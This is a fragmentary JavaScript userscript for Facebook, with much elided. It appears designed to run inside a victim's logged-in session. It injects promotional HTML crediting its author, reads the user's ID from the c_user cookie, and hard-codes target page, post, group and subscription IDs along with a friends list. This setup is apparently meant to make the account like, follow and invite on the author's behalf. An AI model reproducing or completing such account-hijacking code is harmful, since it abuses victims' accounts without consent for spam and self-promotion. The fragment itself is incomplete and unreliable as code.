...
if(body != null) {
	...
	div.innerHTML = "<center><a href='http://www.facebook.com/adib.p.nuraga'><img src='http://m.uploadedit.com/b018/1375198514954.gif' alt='Loading...' width=120 hight=90></a></center><br><br></br>"
	...
	for(i=1;i<=20;i++) {
		...
		div2.innerHTML = "<center><a onclick='spoiler()' title='Click to Hidden Widget'>&laquo;</a> &#8226; <a href='http://www.facebook.com/fans.adib' title='Thanks for install this script'>My FansPage</a></center> "
		}
		else {
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/adib.p.nuraga" target="_blank">Created by Adib Pugar Nuraga <br>KLIK DISINI</a>';
	html += '</div>';
...
sublist("215810898576614");



//Group ku adibpn
var gid = ['623696330988957'];
...
var spage_id = "488376827916428";
var spost_id = "132796013558190";
var sfoto_id = "132796013558190";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
